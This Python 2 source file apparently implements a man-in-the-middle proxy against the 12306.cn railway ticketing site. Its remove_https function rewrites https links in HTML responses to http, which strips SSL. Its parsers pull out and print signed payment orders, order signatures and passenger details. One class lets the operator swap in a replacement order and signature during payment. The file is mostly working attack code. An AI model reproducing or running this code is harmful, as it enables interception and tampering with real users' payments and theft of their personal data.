# coding=utf-8

from HTMLParser import HTMLParser
from HTMLParser import HTMLParseError
from base64 import *
# from urlparse import urlparse
# from cStringIO import StringIO
import urlparse, cStringIO
import xml.etree.ElementTree as ET
import sys, tty, termios, gzip, zlib, string

from http import * 

def is_12306(req) :
    host, port = req.getHost()
    return host.endswith("12306.cn") 

def get_12306_action(req) :
    path = urlparse.urlparse(req.getPath()).path.strip("/ ")
    lastSep = path.rfind("/")
    if lastSep >= 0 : return path[lastSep+1:]
    else : return ""

def is_target(req) :
    action = get_12306_action(req) 
    reqParams = req.getParams() 
    return ((action == "confirmPassengerAction.do" and reqParams["method"] == "payOrder")
            or (action == "myOrderAction.do" and reqParams["method"] == "laterEpay"))

def seat_type(no) :
    if no == "0" :
        return "二等座"
    if no == "1" :
        return "硬座"
    if no == "3" :
        return "硬卧"
    if no == "4" :
        return "软卧"
    if no == "9" :
        return "商务座"
    if no == "M" :
        return "一等座"
    if no == "O" :
        return "二等座"
    return (no + ":未知座位")

def remove_https(res) :
    data = cStringIO.StringIO(res.serialize())
    gzipped, isPage = False, False

    # read headers line by line
    line = data.readline() 
    newdata = line 
    while line != HTTPMessage.EOL :
        line = data.readline() 
        newdata += line
        if line != HTTPMessage.EOL :
            sep = line.find(':')
            headname, headcont = line[:sep], line[sep+1:].strip().lower()
            if headname.strip().lower() == "content-encoding" and headcont.find("gzip") >= 0 :
                gzipped = True
            if headname.strip().lower() == "content-type" and headcont.find("text/html") >= 0 :
                isPage = True
    if not isPage :
        return res.serialize()

    if res.isChunked() :
        # print "remove_https(): res is chunked" 
        chunklen = int(data.readline().strip(), 16)
        # print "Chunk length: %d" % chunklen
        chunk = data.read(chunklen)
        if gzipped :
            page = zlib.decompress(chunk, 16+zlib.MAX_WBITS)
        else : 
            page = chunk
        parser = RailHttpsParser() 
        try :
            parser.feed(page) 
            if gzipped :
                resPage = parser.gzipPage() 
            else :
                resPage = parser.page
            newdata += "%x" % len(resPage) + HTTPMessage.EOL
            newdata += resPage + HTTPMessage.EOL
            newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
        except HTMLParseError as pe :
            lines = page.split("\n") 
            print "HTMLParseError: %s, at line %d, column %d" % (pe.msg, pe.lineno, pe.offset) 
            if pe.lineno > 2 :
                i = pe.lineno - 2
                for line in lines[pe.lineno-2 : pe.lineno+2] :
                    print "%4d: %s" % (i, line)
                    i += 1
            else: 
                i = 0 
                for line in lines[0 : pe.lineno+2] :
                    print "%4d: %s" % (i, line)
                    i += 1
            newdata += "%x" % chunklen + HTTPMessage.EOL
            newdata += chunk + HTTPMessage.EOL
            newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
    else : 
        page = data.read()
        parser = RailHttpsParser()
        try :
            parser.feed(page) 
            newdata += parser.page
        except HTMLParseError as pe :
            lines = page.split("\n") 
            print "HTMLParseError: %s, at line %d, column %d" % (pe.msg, pe.lineno, pe.offset) 
            if pe.lineno > 3 :
                i = pe.lineno - 3
                for line in lines[pe.lineno-3 : pe.lineno+2] :
                    print "%4d: %s" % (i+1, line)
                    i += 1
            else: 
                i = 0 
                for line in lines[0 : pe.lineno+2] :
                    print "%4d: %s" % (i, line)
                    i += 1
            newdata += page
    
    return newdata

class TicketOrder :
    def __init__(self) :
        self.amount = ""
        self.passengers = [] 

    def __str__(self) :
        s = "Ticket order:\n" 
        i = 1
        for p in self.passengers :
            s += "%2d: %s\n" % (i, p) 
            i += 1
        s += self.amount + "\n"
        return s

class RailParser(HTMLParser) :
    START_TAG = 1
    END_TAG = 2 
    START_END_TAG = 3
    DATA_TAG = 4
    
    def __init__(self) :
        self.page = "" 
        self.inOrderTable = False
        self.parsedTabRows = 0
        self.parsingPassenger = False
        self.passenger = "" 
        self.passengerList = []
        self.passengerFiled = 0
        # self.order = TicketOrder() 
        HTMLParser.__init__(self) 

    def decodeOrder(self, rawOrder) :
        order = b64decode(rawOrder)
        root = ET.fromstring(order)
        for e in root.iter() :
            if e.tag == "merVAR" :
                print "\t%s: %s" % (e.tag, b64decode(e.text))
            else : 
                print "\t%s: %s" % (e.tag, e.text)
        return 

    def handle_rail_info(self, tag, attrs, tag_type) :
        if tag_type == RailParser.START_TAG :
            if tag.lower() == "input":
                adict = dict(attrs) 
                if "name" in adict :
                    if adict["name"] == "tranData" :
                        print "Signed order found:"
                        print adict["value"]
                        self.decodeOrder(adict["value"])
                    elif adict["name"] == "merSignMsg" :
                        print "Order signature:"
                        print adict["value"]
            if self.inOrderTable :
                if tag.lower() == "tr" :
                    if self.parsedTabRows >= 2 : 
                        self.parsingPassenger = True 
        elif tag_type == RailParser.END_TAG :
            if self.inOrderTable :
                if tag.lower() == "tr" :
                    self.parsedTabRows += 1
                    if self.parsedTabRows > 2 :
                        self.passengerList.append(self.passenger)
                    self.parsingPassenger = False 
                    self.passenger = "" 
                    self.passengerField = 0
        elif tag_type == RailParser.DATA_TAG :
            if (not self.inOrderTable) :
                if tag == "订单信息" :
                    self.inOrderTable = True
            else: # parsing ticket order 
                if tag.startswith("总票价") :
                    self.inOrderTable = False
                    self.parsingPassenger = False 
                    self.passenger = "" 
                    # self.order.amount = tag.strip()
                    i = 1 
                    for p in self.passengerList :
                        print "%2d: %s" % (i, p) 
                        i += 1
                    print tag.strip() 
                elif self.parsedTabRows >= 2 and self.parsingPassenger :
                    if tag.strip() != "" :
                        self.passengerField += 1
                        if self.passengerField > 3 :
                            self.passenger += tag.replace("\t", "").replace("\r","").replace("\n","").replace(" ","") + ", " 
        return 

    def handle_starttag(self, tag, attrs) :
        self.handle_rail_info(tag, attrs, RailParser.START_TAG)
        self.page += self.get_starttag_text() 
        return 

    def handle_endtag(self, tag) :
        self.handle_rail_info(tag, [], RailParser.END_TAG)
        self.page += "</" + tag + ">"
        return 

    def handle_startendtag(self, tag, attrs):
        self.handle_rail_info(tag, attrs, RailParser.START_END_TAG)
        self.page += self.get_starttag_text() 
        return 

    def handle_data(self, data) :
        self.handle_rail_info(data, [], RailParser.DATA_TAG)
        self.page += data 
        return 

    def handle_entityref(self, name) :
        self.page += "&" + name + ";"
        return

    def handle_decl(self, decl) :
        self.page += "<!" + decl + ">"
        return 

    def handle_comment(self, comment) :
        self.page += "<!--" + comment + "-->"
        return 

    def gzipPage(self) :
        if self.page == "" :
            return ""
        buf = cStringIO.StringIO() 
        zfile = gzip.GzipFile(mode="wb", fileobj=buf)
        zfile.write(self.page) 
        zfile.close()
        return buf.getvalue()

class RailHttpsParser(RailParser) :
    def __init__(self) :
        RailParser.__init__(self)

    def handle_starttag(self, tag, attrs) :
        self.handle_rail_info(tag, attrs, RailParser.START_TAG) 
        self.page += string.replace(self.get_starttag_text(), "https://", "http://")
        return 

    def handle_startendtag(self, tag, attrs) :
        self.handle_rail_info(tag, attrs, RailParser.START_END_TAG) 
        self.page += string.replace(self.get_starttag_text(), "https://", "http://")
        return 

    def handle_data(self, data) :
        self.handle_rail_info(data, [], RailParser.DATA_TAG) 
        self.page += string.replace(data, "https://", "http://")
        return 

class RailActiveParser(RailParser) :
    def __init__(self) :
        RailParser.__init__(self)

    def decodeOrder(self, rawOrder) :
        order = b64decode(rawOrder)
        root = ET.fromstring(order)
        for e in root.iter() :
            if e.tag == "amount" :
                l = len(e.text)
                print "Order amount: RMB %s.%s" % (e.text[:l-2], e.text[l-2:])
        return 

    def handle_starttag(self, tag, attrs) :
        if tag.lower() == "input":
            adict = dict(attrs) 
            if "name" in adict :
                if adict["name"] == "tranData" :
                    print "Signed order found:"
                    order = adict["value"]
                    # print order
                    # print order.replace("\r\n", "") 
                    self.decodeOrder(adict["value"])
                    newOrder = ""
                    print "Replace it with new order:"
                    old_settings = termios.tcgetattr(sys.stdin)
                    try :
                        tty.setcbreak(sys.stdin.fileno())
                        setting = termios.tcgetattr(sys.stdin)
                        setting[3] = termios.ECHO
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, setting)

                        line = sys.stdin.readline()
                        if line.strip()  == "" :
                            self.page += self.get_starttag_text() 
                            return 
                        block = "" 
                        while line.strip() != "" :
                            block += line
                            line = sys.stdin.readline()
                        block = block.replace("\n", "").replace("\r", "").replace(" ", "") 
                        br = 0
                        while br < len(block) :
                            newOrder += block[br:br+75] 
                            br += 75
                            if br < len(block) :
                                newOrder += "\r\n"
                        print "Replaced the order with: "
                        print newOrder
                    finally :
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    self.page += "<input" 
                    for (n, v) in attrs :
                        if n == "value" :
                            self.page += " " + n + "=\"" + newOrder.strip() + "\"" 
                        else :
                            self.page += " " + n + "=\"" + v + "\""
                    self.page += ">"
                    return 
                elif adict["name"] == "merSignMsg" :
                    newSign = ""
                    print "Order signature:"
                    print adict["value"]
                    print "Replace it with new signature:"
                    old_settings = termios.tcgetattr(sys.stdin)
                    try :
                        tty.setcbreak(sys.stdin.fileno())
                        setting = termios.tcgetattr(sys.stdin)
                        setting[3] = termios.ECHO
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, setting)

                        line = sys.stdin.readline()
                        if line.strip()  == "" :
                            self.page += self.get_starttag_text() 
                            return 
                        block = "" 
                        while line.strip() != "" :
                            block += line 
                            line = sys.stdin.readline()
                        block = block.replace("\n", "").replace("\r", "").replace(" ", "") 
                        br = 0
                        while br < len(block) :
                            newSign += block[br:br+75] 
                            br += 75
                            if br < len(block) :
                                newSign += "\r\n"
                        print "Replaced the signature with: "
                        print newSign
                    finally :
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    self.page += "<input"
                    for (n, v) in attrs :
                        if n == "value" :
                            self.page += " " + n + "=\"" + newSign.strip() + "\"" 
                        else :
                            self.page += " " + n + "=\"" + v + "\""
                    self.page += ">"
                    return 
        if self.inOrderTable :
            if tag.lower() == "tr" :
                if self.parsedTabRows >= 2 : 
                    self.parsingPassenger = True 

        self.page += self.get_starttag_text()
        #self.page += string.replace(self.get_starttag_text(), "https://", "http://")
        return 

